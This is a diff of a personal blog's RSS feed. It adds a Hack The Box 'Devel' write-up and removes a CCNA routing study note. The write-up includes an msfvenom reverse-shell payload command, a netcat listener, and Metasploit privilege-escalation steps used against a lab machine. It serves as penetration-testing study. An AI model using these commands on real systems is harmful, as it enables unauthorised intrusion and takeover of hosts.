@@ -8,8 +8,71 @@
     <language>en</language>
     <managingEditor>leewookb@gmail.com (Wook Lee)</managingEditor>
     <webMaster>leewookb@gmail.com (Wook Lee)</webMaster>
-    <lastBuildDate>Tue, 06 Aug 2024 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 07 Aug 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>[HTB] Devel</title>
+      <link>http://localhost:1313/htb-devel/</link>
+      <pubDate>Wed, 07 Aug 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/htb-devel/</guid>
+      <description>Scanning with nmap the nmap scan results show that ftp-anonymous login is allowed. I explored a directory but couldn&amp;rsquo;t find any useful info on the server. Because the http port 80 server is also open, I tried navigating to the address on Firefox. More information gathering Then I tried gathering more information which really did not help much and that made me realize there was an easier way to go about this.</description>
+      <content:encoded><![CDATA[<h4 id="scanning-with-nmap">Scanning with nmap</h4>
+<p>the nmap scan results show that <strong><em>ftp-anonymous</em></strong> login is allowed.
+<img src="image.png#center" alt="alt text"></p>
+<br>
+<p>I explored a directory but couldn&rsquo;t find any useful info on the server.
+<img src="image-1.png#center" alt="alt text"></p>
+<br>
+<p>Because the http port 80 server is also open, I tried navigating to the address on Firefox.
+<img src="image-2.png#center" alt="alt text"></p>
+<br>
+<h4 id="more-information-gathering">More information gathering</h4>
+<p>Then I tried gathering more information which really did not help much and that made me realize there was an easier way to go about this. Because the ftp server was open I could just generate a payload and run it on the webserver and pop the reverse shell.
+<img src="image-3.png#center" alt="alt text"></p>
+<p><img src="image-4.png#center" alt="alt text"></p>
+<p><img src="image-5.png#center" alt="alt text"></p>
+<br>
+<h4 id="generating-a-payload">Generating a payload</h4>
+<p>I generated a reverse shell payload with <strong><em>msfvenom</em></strong> and the extension is <strong><em>.asp</em></strong> since we saw the extension on the ftp server.</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=1234 -f asp &gt; reverse.aspx</code></p>
+<p><img src="image-6.png#center" alt="alt text"></p>
+<br>
+<p>uploaded the reverse shell that I generated onto the ftp server using the <strong><em>put</em></strong> command.</p>
+<p><img src="image-7.png#center" alt="alt text"></p>
+<br>
+<p>Before navigating to <strong>http://10.10.10.5/reverse.aspx</strong>, I had to start a netcat server to listen to the port by running the following command:
+<code>nc -lvnp 1234</code></p>
+<br>
+<p>For some reason, my netcat listener kept crashing. As an alternative, I switched to <strong><em>msfconsole</em></strong> and utilized <strong><em>multi/handler</em></strong> to listen ports.</p>
+<p><img src="image-8.png#center" alt="alt text"></p>
+<br>
+<p><img src="image-9.png#center" alt="alt text"></p>
+<br>
+<p>I was able to get the shell but the user was not the admin with low privileges that I couldn&rsquo;t access many directories with the current user. As you could see from the picture below the <strong><em>getuid</em></strong> returned IIS APPPOOL\Web which is not the administrator. It was time to utilize the <strong><em>privilege escaltion</em></strong> to move vertically and gain access.</p>
+<p><img src="image-10.png#center" alt="alt text"></p>
+<br>
+<p>After some research, I learned that there exists a post module in meterpreter. So I backgrouned the current session and searched for the module. <code>search type:post path:post/multi</code>.</p>
+<p><img src="image-11.png#center" alt="alt text"></p>
+<p><img src="image-12.png#center" alt="alt text"></p>
+<br>
+<p>As the name of the exploit (<strong><em>local_exploit_suggester</em></strong>) implies it suggested many available exploits and I decided to use the 3rd exploit, which is <strong>exploit/windows/local/ms10_015_kitrap0d</strong>.</p>
+<p><img src="image-13.png#center" alt="alt text"></p>
+<br>
+<p>set the <strong><em>SESSION</em></strong> as 1, because the backgrouned session is the only session we have and set othe required options.</p>
+<p><img src="image-14.png#center" alt="alt text"></p>
+<br>
+<p>I succeeded in getting the root shell. <strong><em>getuid</em></strong> command returned NT AUTHORITY\SYSTEM, another name for root.
+<img src="image-15.png#center" alt="alt text"></p>
+<br>
+<p>found the user flag.
+<img src="image-17.png#center" alt="alt text"></p>
+<br>
+<p>found the root flag.
+<img src="image-16.png#center" alt="alt text"></p>
+<br>
+<p><img src="image-18.png#center" alt="alt text"></p>
+]]></content:encoded>
+    </item>
     <item>
       <title>[HTB] Blue</title>
       <link>http://localhost:1313/htb-blue/</link>
@@ -9136,78 +9199,6 @@ The final command <code>xfreerdp /v:10.129.1.13 /cert-ignore /u:Administrator</c
 <pre tabindex="0"><code>951fa96d7830c451b536be5a6be008a0</code></pre>
 <div style="text-align: center"><img src="./image10.png"></div>
 <div style="text-align: center"><img src="./image11.png"></div>
-]]></content:encoded>
-    </item>
-    <item>
-      <title>[TIL] Routing</title>
-      <link>http://localhost:1313/til-routing/</link>
-      <pubDate>Tue, 18 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/til-routing/</guid>
-      <description>I&amp;rsquo;m currently studying for the CCNA exam, primarily using Jeremy&amp;rsquo;s IT Lab YouTube channel. He&amp;rsquo;s well-known for providing great CCNA content, and the best part is that it&amp;rsquo;s all free on YouTube. Jeremy also offers Anki flashcards, which I absolutely love and use daily, as well as Cisco Packet Tracer, which is an excellent resource for hands-on practice. I plan to take the exam in 3 to 4 months, though this timeline might change depending on my study and preparation progress.</description>
-      <content:encoded><![CDATA[<p>I&rsquo;m currently studying for the CCNA exam, primarily using Jeremy&rsquo;s IT Lab YouTube channel. He&rsquo;s well-known for providing great CCNA content, and the best part is that it&rsquo;s all free on YouTube. Jeremy also offers Anki flashcards, which I absolutely love and use daily, as well as Cisco Packet Tracer, which is an excellent resource for hands-on practice. I plan to take the exam in 3 to 4 months, though this timeline might change depending on my study and preparation progress.</p>
-<p>Today, I learned about routing.</p>
-<h3 id="what-is-routing">What is Routing?</h3>
-<hr>
-<p>Definition:</p>
-<blockquote>
-<p>Routing is the process that routers use to determine the path that IP packets should take over a network to reach their destination.</p>
-</blockquote>
-<p>When a router receives a packet, it&rsquo;s the router&rsquo;s job to forward it to the correct destination.</p>
-<p>Routers store routes to all of their known destinations in a <code>Routing table</code>.</p>
-<p>Switches keep a MAC address table with their known destination MAC addresses, and routers keep a routing table with their known destination networks.</p>
-<p>When routers receive packets, they look in the routing table to find the best route to forward the packet.</p>
-<p>There are two main routing methods:</p>
-<ul>
-<li>
-<p><code>dynamic routing</code>: Routers use dynamic protocols (i.e., OSPF) to share routing information with each other automatically and build their routing tables.</p>
-</li>
-<li>
-<p><code>static routing</code>: A network engineer/admin manually configures routes on the router.
-But before we go into routing methods,</p>
-</li>
-</ul>
-<h3 id="what-exactly-is-a-route">What exactly is a route?</h3>
-<hr>
-<p>Basically, it&rsquo;s an instruction to the router.</p>
-<p>A route tells the router:</p>
-<ul>
-<li>To send a packet to destination X, you should send the packet to next-hop Y.</li>
-<li>or, if the destination is directly connected to the router, send the packet directly to the destination.</li>
-<li>or, if the destination is the router&rsquo;s own IP address, receive the packet for yourself (don&rsquo;t forward it).</li>
-</ul>
-<p>Also, there are few types of routes found in routing tables.</p>
-<ol>
-<li><code>Connected routes</code></li>
-<li><code>Local routes</code></li>
-</ol>
-<p><code>Connected Routes</code></p>
-<ul>
-<li>These are routes that are directly connected to a router&rsquo;s interface.</li>
-<li>they are automatically created when an interface is configured with an IP address and brought up. Connected routes are essential for a router to communicate with devices on the directly attached network.</li>
-</ul>
-<p><code>Local Routes</code></p>
-<ul>
-<li>These are routes to the IP addresses assigned to the router&rsquo;s own interfaces.</li>
-<li>Local routes are used to specify that the router can directly reach its own IP addresses. They have the highest priority in the routing table since the router must be able to communicate with its own interfaces.</li>
-<li><code>/32</code> netmask is used to specify the exact IP address of the interface.</li>
-</ul>
-<p>There&rsquo;s a special kind of static route called a <code>default route</code>.</p>
-<p>This is a route that you configure inside the router that says, if nothing else matches inside of our routing table, send the traffic this way.</p>
-<p>It&rsquo;s also known as the &ldquo;gateway of last resort&rdquo;</p>
-<p>A default route is a route to <code>0.0.0.0/0</code></p>
-<ul>
-<li><code>/0</code> means that all bits of the netmask are 0, so none of the bits of the addresses are fixed. They can all change to be either 0 or 1.</li>
-<li><code>0.0.0.0/0</code> is the least specific route possible; it includes every possible destination IP address.</li>
-<li>If the router doesn&rsquo;t have any more specific routes that match a packet&rsquo;s destination IP address, the router will forward the packet using the default route.</li>
-</ul>
-<ul>
-<li>A default route is often used to direct traffic to the Internet.
-<ul>
-<li>More specific routes are used for destinations in the internal corporate network.</li>
-<li>Traffic to destinations outside of the internal network is sent to the Internet.</li>
-</ul>
-</li>
-</ul>
 ]]></content:encoded>
     </item>
   </channel>
